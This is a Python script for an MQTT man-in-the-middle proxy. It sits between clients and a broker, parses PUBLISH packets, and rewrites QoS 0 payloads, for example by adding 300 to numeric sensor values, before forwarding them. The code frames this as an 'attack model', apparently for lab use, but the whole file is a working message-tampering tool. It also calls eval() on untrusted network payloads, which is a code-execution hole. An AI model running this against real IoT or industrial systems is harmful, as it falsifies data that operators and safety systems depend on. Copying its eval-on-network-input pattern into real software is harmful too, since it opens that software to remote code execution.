import asyncio
import argparse
import logging
from typing import Tuple

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("mqtt-mitm")

# ---------------- MQTT helpers ----------------
def decode_varint(stream_bytes: bytes, offset: int = 0) -> Tuple[int,int]:
    """
    Decode MQTT Remaining Length varint from stream_bytes[offset:].
    Returns (value, length_of_varint_bytes).
    """
    mul = 1
    value = 0
    i = offset
    while True:
        if i >= len(stream_bytes):
            raise ValueError("Not enough bytes to decode varint")
        encoded = stream_bytes[i]
        value += (encoded & 0x7F) * mul
        i += 1
        if (encoded & 0x80) == 0:
            break
        mul *= 128
        if mul > 128**4:
            raise ValueError("Malformed varint")
    return value, i - offset

def encode_varint(value: int) -> bytes:
    """Encode MQTT Remaining Length as varint bytes."""
    out = bytearray()
    while True:
        encoded = value % 128
        value //= 128
        # if there are more bytes to encode, set the top bit of this byte
        if value > 0:
            encoded |= 0x80
        out.append(encoded)
        if value == 0:
            break
    return bytes(out)

async def read_exact(reader: asyncio.StreamReader, n: int) -> bytes:
    data = await reader.readexactly(n)
    return data

async def read_mqtt_packet(reader: asyncio.StreamReader) -> bytes:
    """
    Read exactly one MQTT packet (fixed header + remaining length + payload) from reader.
    Returns full packet bytes.
    """
    # read first byte
    first = await reader.readexactly(1)
    # read remaining length varint byte by byte
    varint_bytes = bytearray()
    while True:
        b = await reader.readexactly(1)
        varint_bytes.append(b[0])
        if (b[0] & 0x80) == 0:
            break
    remaining_len, _ = decode_varint(bytes(varint_bytes), 0)
    if remaining_len:
        rest = await reader.readexactly(remaining_len)
    else:
        rest = b''
    return first + bytes(varint_bytes) + rest

def parse_publish_packet(packet: bytes):
    """
    Parse MQTT PUBLISH packet (packet is full fixed header + remaining + payload).
    Returns dict with fields: dup,qos,retain, topic, packet_id (None if qos==0), payload_bytes, indices for reconstruction.
    """
    b0 = packet[0]
    packet_type = b0 >> 4
    if packet_type != 3:  # not PUBLISH
        return None
    flags = b0 & 0x0F
    dup = bool(flags & 0x08)
    qos = (flags & 0x06) >> 1
    retain = bool(flags & 0x01)

    # decode remaining length varint
    # find varint length
    idx = 1
    mul = 1
    remaining_len = 0
    while True:
        encoded = packet[idx]
        remaining_len += (encoded & 0x7F) * mul
        idx += 1
        if (encoded & 0x80) == 0:
            break
        mul *= 128

    varint_len = idx - 1
    var_header_payload = packet[1 + varint_len:]  # variable header + payload

    # topic length (2 bytes) then topic
    if len(var_header_payload) < 2:
        raise ValueError("Malformed publish: missing topic length")
    topic_len = int.from_bytes(var_header_payload[0:2], "big")
    if len(var_header_payload) < 2 + topic_len:
        raise ValueError("Malformed publish: incomplete topic")
    topic = var_header_payload[2:2 + topic_len].decode('utf-8', errors='ignore')
    offset = 2 + topic_len
    packet_id = None
    if qos > 0:
        if len(var_header_payload) < offset + 2:
            raise ValueError("Malformed publish: missing packet id")
        packet_id = int.from_bytes(var_header_payload[offset:offset+2], "big")
        offset += 2
    payload_bytes = var_header_payload[offset:]
    # indices for reconstructing: fixed header length = 1 + varint_len
    fixed_len = 1 + varint_len
    return {
        "dup": dup,
        "qos": qos,
        "retain": retain,
        "topic": topic,
        "packet_id": packet_id,
        "payload": payload_bytes,
        "fixed_header_len": fixed_len,
        "var_header_payload": var_header_payload,
        "var_header_len": offset
    }

def build_publish_packet(fixed_byte:int, topic:str, qos:int, packet_id, payload_bytes: bytes) -> bytes:
    """
    Build a PUBLISH packet from components (for QoS0, packet_id should be None).
    fixed_byte: original first byte (with flags)
    """
    # variable header
    tbytes = topic.encode('utf-8')
    var_header = len(tbytes).to_bytes(2, "big") + tbytes
    if qos > 0:
        var_header += (packet_id.to_bytes(2, "big"))
    payload = payload_bytes
    remaining = len(var_header) + len(payload)
    rem_bytes = encode_varint(remaining)
    return bytes([fixed_byte]) + rem_bytes + var_header + payload

# ---------------- mutation function (customize me!) ----------------
def mutate_payload_str(payload_str: str, topic: str) -> str:
    """
    Replace payload according to your attack model.
    payload_str is original payload decoded as text.
    Return new string payload (must be encodeable back to bytes).
    Example: if payload is like "[12]" we return "[312]" (adds 300)
    """
    try:
        # try JSON style
        import json
        obj = json.loads(payload_str)
        if isinstance(obj, list) and len(obj) >= 1 and isinstance(obj[0], (int, float)):
            obj[0] = obj[0] + 300  # example mutation
            return json.dumps(obj)
    except Exception:
        pass

    # fallback: try eval for lab quickness (unsafe for untrusted payloads)
    try:
        obj = eval(payload_str)
        if isinstance(obj, list) and len(obj) >= 1 and isinstance(obj[0], (int, float)):
            obj[0] = obj[0] + 300
            return str(obj)
    except Exception:
        pass

    # if cannot parse, append tag
    return payload_str + " [modified]"

# ---------------- proxy core ----------------
async def handle_client(local_reader: asyncio.StreamReader, local_writer: asyncio.StreamWriter, upstream_host: str, upstream_port: int):
    remote_reader, remote_writer = await asyncio.open_connection(upstream_host, upstream_port)
    peer = local_writer.get_extra_info('peername')
    logger.info("Client connected from %s -> forwarding to %s:%d", peer, upstream_host, upstream_port)

    async def forward(reader: asyncio.StreamReader, writer: asyncio.StreamWriter, direction: str):
        try:
            while True:
                # read one MQTT packet
                packet = await read_mqtt_packet(reader)
                if not packet:
                    break
                # inspect fixed header first byte
                first_byte = packet[0]
                packet_type = first_byte >> 4
                if packet_type == 3:  # PUBLISH
                    info = parse_publish_packet(packet)
                    if info is None:
                        # forward unchanged
                        writer.write(packet)
                        await writer.drain()
                        continue
                    qos = info['qos']
                    topic = info['topic']
                    payload_bytes = info['payload']
                    if qos == 0:
                        try:
                            text = payload_bytes.decode('utf-8', errors='ignore')
                            new_text = mutate_payload_str(text, topic)
                            new_payload_bytes = new_text.encode('utf-8')
                            # rebuild packet
                            new_packet = build_publish_packet(first_byte, topic, qos, None, new_payload_bytes)
                            writer.write(new_packet)
                            await writer.drain()
                            logger.info("Modified PUBLISH topic=%s old=%s new=%s (dir=%s)", topic, text, new_text, direction)
                            continue
                        except Exception as e:
                            logger.exception("Failed to mutate payload: %s", e)
                            # fall back to forwarding original
                    # if qos>0 or mutation failed, forward original
                writer.write(packet)
                await writer.drain()
        except asyncio.IncompleteReadError:
            pass
        except Exception as e:
            logger.exception("Forwarding error: %s", e)
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    # spawn two tasks: client->server and server->client
    task1 = asyncio.create_task(forward(local_reader, remote_writer, "c2s"))
    task2 = asyncio.create_task(forward(remote_reader, local_writer, "s2c"))
    await asyncio.wait([task1, task2], return_when=asyncio.FIRST_COMPLETED)
    logger.info("Connection closed for %s", peer)
    try:
        local_writer.close()
        await local_writer.wait_closed()
    except Exception:
        pass
    try:
        remote_writer.close()
        await remote_writer.wait_closed()
    except Exception:
        pass

async def run_server(listen_host, listen_port, upstream_host, upstream_port):
    server = await asyncio.start_server(lambda r,w: handle_client(r,w,upstream_host,upstream_port), listen_host, listen_port)
    addr = server.sockets[0].getsockname()
    logger.info("MITM proxy listening on %s:%d forwarding to %s:%d", addr[0], addr[1], upstream_host, upstream_port)
    async with server:
        await server.serve_forever()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--listen-host", default="0.0.0.0")
    ap.add_argument("--listen-port", type=int, default=1883)
    ap.add_argument("--upstream-host", required=True)
    ap.add_argument("--upstream-port", type=int, default=1883)
    args = ap.parse_args()
    try:
        asyncio.run(run_server(args.listen_host, args.listen_port, args.upstream_host, args.upstream_port))
    except KeyboardInterrupt:
        logger.info("Stopping")

if __name__ == "__main__":
    main()
